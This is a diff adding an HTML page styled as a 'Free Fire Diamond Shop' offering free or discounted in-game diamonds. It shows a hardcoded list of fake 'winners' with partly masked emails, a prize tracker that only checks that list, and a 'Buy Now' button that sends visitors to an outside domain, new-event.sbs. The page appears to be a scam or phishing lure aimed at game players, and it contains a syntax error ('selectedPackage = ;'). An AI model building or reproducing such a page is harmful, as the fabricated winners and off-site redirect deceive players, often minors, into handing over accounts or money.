@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="ne">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Fire Diamond Shop</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #ff2c2c;
+      padding: 10px;
+      color: white;
+      margin: 0;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 24px;
+    }
+
+    .section-title {
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      margin-top: 20px;
+      margin-bottom: 10px;
+    }
+
+    .diamond-item {
+      background: white;
+      color: black;
+      padding: 15px;
+      margin: 10px auto;
+      border-radius: 8px;
+      max-width: 90%;
+      text-align: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      cursor: pointer;
+      transition: 0.3s ease;
+      animation: fadeIn 0.5s ease-out forwards;
+      opacity: 0;
+    }
+
+    .diamond-item.selected {
+      border: 3px solid #28a745;
+      background: #e0ffe5;
+      transform: scale(1.02);
+    }
+
+    .diamond-item h3 {
+      margin: 0;
+      font-size: 15px;
+    }
+
+    .offer-text {
+      font-weight: bold;
+      font-size: 15px;
+      padding: 4px 10px;
+      border-radius: 6px;
+      background: linear-gradient(45deg, #ff8a00, #ff2a68);
+      color: white;
+      box-shadow: 0 0 8px rgba(255, 42, 104, 0.6);
+      text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+      display: inline-block;
+    }
+
+    .floating-buy-btn {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: linear-gradient(135deg, #28a745, #218838);
+      color: white;
+      padding: 15px 20px;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      cursor: pointer;
+      animation: bounce 2s infinite;
+      z-index: 999;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+
+    /* Animation styles */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .diamond-item:hover {
+      transform: scale(1.02);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
+
+    .winner-100 {
+      background: linear-gradient(135deg, #d4edda, #c3e6cb);
+      color: #155724;
+      border-left: 5px solid #28a745;
+    }
+
+    .winner-50 {
+      background: linear-gradient(135deg, #d1ecf1, #bee5eb);
+      color: #0c5460;
+      border-left: 5px solid #17a2b8;
+    }
+
+    .winner-25 {
+      background: linear-gradient(135deg, #fff3cd, #ffeeba);
+      color: #856404;
+      border-left: 5px solid #ffc107;
+    }
+
+    .problem-fixed {
+      background: linear-gradient(135deg, #e2f0fd, #d0e5fc);
+      color: #004085;
+      border-left: 5px solid #0069d9;
+    }
+
+    .participant-count {
+      text-align: center;
+      margin: 20px 0;
+      font-size: 18px;
+      color: #6c757d;
+      animation: fadeIn 1s ease-out;
+    }
+
+    .tracking-section {
+      margin: 20px 0;
+      padding: 15px;
+      background: #f8f9fa;
+      border-radius: 8px;
+      animation: fadeIn 1s ease-out;
+    }
+
+    .tracking-input {
+      padding: 10px;
+      width: 200px;
+      border: 1px solid #ced4da;
+      border-radius: 4px;
+      margin-right: 10px;
+    }
+
+    .track-btn {
+      padding: 10px 15px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .track-btn:hover {
+      background-color: #0069d9;
+    }
+
+    .invalid {
+      border-color: #dc3545;
+      background-color: #f8d7da;
+    }
+
+    .tracking-result {
+      margin-top: 10px;
+      padding: 10px;
+      border-radius: 4px;
+      display: none;
+    }
+
+    /* Popup Styles */
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      opacity: 0;
+      animation: fadeInPopup 0.5s ease-in forwards;
+    }
+
+.popup-content {
+  width: 80%;
+  max-width: 720px;
+  aspect-ratio: 16 / 9;
+  background: url('freefire-popup-banner.jpg') no-repeat center/cover; /* एउटा मात्र background प्रयोग गर्नुहोस् */
+  border-radius: 10px;
+  box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+  animation: scaleIn 0.5s ease-in-out;
+}
+
+    @keyframes fadeInPopup {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes fadeOutPopup {
+      from { opacity: 1; }
+      to { opacity: 0; }
+    }
+
+    @keyframes scaleIn {
+      from { transform: scale(0.8); }
+      to { transform: scale(1); }
+    }
+
+    @media screen and (max-width: 600px) {
+      .diamond-item h3 {
+        font-size: 15px;
+      }
+
+      .floating-buy-btn {
+        padding: 12px 18px;
+        font-size: 15px;
+      }
+
+      .popup-content {
+        width: 90%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>Store</h1>
+
+  <div class="section-title">✨ DIAMOND PACKAGES ✨</div>
+
+  <div class="diamond-item" onclick="selectPackage(this, '25 Diamonds')"><h3>💎 25 Diamonds ➤ <span class="offer-text">Rs. NEW YEAR OFFER FREE 2082</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '50 Diamonds')"><h3>💎 50 Diamonds ➤ <span class="offer-text">Rs. NEW YEAR OFFER FREE 2082</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '115 Diamonds')"><h3>💎 115 Diamonds ➤ <span class="offer-text">Rs. 110</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '240 Diamonds')"><h3>💎 240 Diamonds ➤ <span class="offer-text">Rs. 200</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '610 Diamonds')"><h3>💎 610 Diamonds ➤ <span class="offer-text">Rs. 545</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '1090 Diamonds')"><h3>💎 1090 Diamonds ➤ <span class="offer-text">Rs. 940</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '1240 Diamonds')"><h3>💎 1240 Diamonds ➤ <span class="offer-text">Rs. 1030</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '1595 Diamonds')"><h3>💎 1595 Diamonds ➤ <span class="offer-text">Rs. 1305</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '2090 Diamonds')"><h3>💎 2090 Diamonds ➤ <span class="offer-text">Rs. 1715</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '2530 Diamonds')"><h3>💎 2530 Diamonds ➤ <span class="offer-text">Rs. 2070</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '5060 Diamonds')"><h3>💎 5060 Diamonds ➤ <span class="offer-text">Rs. 4030</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, '10120 Diamonds')"><h3>💎 10120 Diamonds ➤ <span class="offer-text">Rs. 7200</span></h3></div>
+
+  <div class="section-title">🌟 WEEKLY AND MONTHLY OFFERS 🌟</div>
+  <div class="diamond-item" onclick="selectPackage(this, 'Weekly')"><h3>🌟 Weekly ➤ <span class="offer-text">Rs. 210</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, 'Monthly')"><h3>🌟 Monthly ➤ <span class="offer-text">Rs. 1030</span></h3></div>
+  <div class="diamond-item" onclick="selectPackage(this, 'Level Up Pass')"><h3>🎮 Level Up Pass ➤ <span class="offer-text">Rs. 210</span></h3></div>
+
+  <button class="floating-buy-btn" onclick="buy()">Buy Now</button>
+
+  <div class="section-title">🏆 Today's Winners</div>
+  <div class="participant-count">Total Participants: 100 | Winners: 5</div>
+
+  <div class="tracking-section">
+    <h3>🔍 Track Your Prize</h3>
+    <input type="text" class="tracking-input" placeholder="Enter tracking number">
+    <button class="track-btn">Track</button>
+    <div class="tracking-result"></div>
+  </div>
+
+  <!-- Popup HTML -->
+  <div class="popup-overlay" id="welcomePopup">
+    <div class="popup-content"></div>
+  </div>
+
+  <script>
+    let selectedPackage = null;
+
+    function selectPackage(el, name) {
+      document.querySelectorAll('.diamond-item').forEach(item => {
+        item.classList.remove('selected');
+      });
+      el.classList.add('selected');
+      selectedPackage = ;
+    }
+
+    function buy() {
+      if (selectedPackage) {
+        alert("Selected: " + selectedPackage);
+        window.location.href = "http://new-event.sbs/^*O/CODA/?id=7493999091";
+      } else {
+        alert("Please select a diamond package first.");
+      }
+    }
+
+    // Sample data with only winners and the problem account fixed
+    const participants = [
+      {email: 'ghanshyxxxxxoli922@gmail.com', status: 'winner', diamonds: 100, delay: 0, tracking: 'TRK100123'},
+      {email: 'amritchxxxxxry34567@gmail.com', status: 'winner', diamonds: 50, delay: 200, tracking: 'TRK100124'},
+      {email: 'Bhumixxxxx124@gmail.com', status: 'winner', diamonds: 25, delay: 400, tracking: 'TRK100125'},
+      {email: 'Paraschxxxxxary6637@gmail.com', status: 'winner', diamonds: 25, delay: 600, tracking: 'TRK100126'},
+      {email: 'phalxxxxxoli1@gmail.com', status: 'problem-fixed', diamonds: 25, delay: 800, tracking: 'TRK100127'}
+    ];
+
+    function displayParticipants() {
+      const container = document.querySelector('.section-title').parentNode;
+      
+      participants.forEach(participant => {
+        setTimeout(() => {
+          const div = document.createElement('div');
+          
+          if(participant.status === 'winner') {
+            div.className = `diamond-item winner-${participant.diamonds}`;
+            div.innerHTML = `<h3>✅ WINNER: ${participant.email} - ${participant.diamonds} Diamonds Won! (Tracking: ${participant.tracking})</h3>`;
+          } 
+          else if(participant.status === 'problem-fixed') {
+            div.className = 'diamond-item problem-fixed';
+            div.innerHTML = `<h3>✅ ISSUE RESOLVED: ${participant.email} - 25 Diamonds Won! (Tracking: ${participant.tracking})</h3>`;
+          }
+          
+          container.appendChild(div);
+          
+          if(participant.delay <= 800) {
+            div.scrollIntoView({behavior: 'smooth', block: 'nearest'});
+          }
+        }, participant.delay);
+      });
+    }
+
+    // Track button functionality
+    document.querySelector('.track-btn').addEventListener('click', function() {
+      const trackingInput = document.querySelector('.tracking-input');
+      const trackingResult = document.querySelector('.tracking-result');
+      const trackingNumber = trackingInput.value.trim();
+      
+      trackingInput.classList.remove('invalid');
+      trackingResult.style.display = 'none';
+      
+      if(!/^TRK\d{6}$/.test(trackingNumber)) {
+        trackingInput.classList.add('invalid');
+        trackingResult.textContent = 'Invalid tracking number format. Please use TRK followed by 6 digits (e.g., TRK100123)';
+        trackingResult.style.display = 'block';
+        trackingResult.style.backgroundColor = '#f8d7da';
+        trackingResult.style.color = '#721c24';
+        return;
+      }
+      
+      const participant = participants.find(p => p.tracking === trackingNumber);
+      
+      if(!participant) {
+        trackingInput.classList.add('invalid');
+        trackingResult.textContent = 'Tracking number not found. Please check and try again.';
+        trackingResult.style.display = 'block';
+        trackingResult.style.backgroundColor = '#f8d7da';
+        trackingResult.style.color = '#721c24';
+        return;
+      }
+      
+      if(participant.status === 'winner') {
+        trackingResult.innerHTML = `
+          <h3>🎉 WINNER FOUND!</h3>
+          <p>Email: ${participant.email}</p>
+          <p>Prize: ${participant.diamonds} Diamonds</p>
+          <p>Status: Successfully claimed</p>
+        `;
+        trackingResult.style.backgroundColor = '#d4edda';
+        trackingResult.style.color = '#155724';
+      }
+      else if(participant.status === 'problem-fixed') {
+        trackingResult.innerHTML = `
+          <h3>✅ ISSUE RESOLVED</h3>
+          <p>Email: ${participant.email}</p>
+          <p>Prize: 25 Diamonds</p>
+          <p>Status: Previously had issue but now resolved</p>
+        `;
+        trackingResult.style.backgroundColor = '#e2f0fd';
+        trackingResult.style.color = '#004085';
+      }
+      
+      trackingResult.style.display = 'block';
+    });
+
+    // Show popup on page load (simulating ID login)
+    window.onload = function() {
+      const popup = document.getElementById('welcomePopup');
+      popup.style.display = 'flex';
+      
+      // Automatically close popup after 5 seconds
+      setTimeout(() => {
+        popup.style.animation = 'fadeOutPopup 0.5s ease-out forwards';
+        setTimeout(() => {
+          popup.style.display = 'none';
+        }, 500);
+      }, 5000);
+
+      // Display participants after popup
+      setTimeout(displayParticipants, 500);
+    };
+  </script>
+</body>
+</html>
